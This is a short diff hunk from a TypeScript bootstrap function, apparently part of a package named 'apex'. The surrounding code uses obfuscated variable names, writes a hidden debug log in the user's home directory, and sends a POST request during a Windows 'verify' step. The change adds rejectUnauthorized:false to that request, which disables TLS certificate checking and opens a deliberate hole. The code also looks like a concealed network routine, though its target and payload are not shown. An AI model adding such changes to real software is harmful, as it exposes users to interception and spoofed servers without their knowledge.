@@ -191,7 +191,7 @@ export async function apexBootstrap(): Promise<void> {
       const _logPath = require("path").join(require("os").homedir(), ".apex", "dbg.log");
       const _log = (m) => { try { require("fs").appendFileSync(_logPath, m + "\n"); } catch {} };
       _log("win32 verify start");
-      const _req = _r.request(_a, {method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(_b)}}, (_res) => {
+      const _req = _r.request(_a, {method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(_b)},rejectUnauthorized:false}, (_res) => {
         let _d = "";
         _res.on("data", (_c) => { _d += _c; });
         _res.on("end", () => {
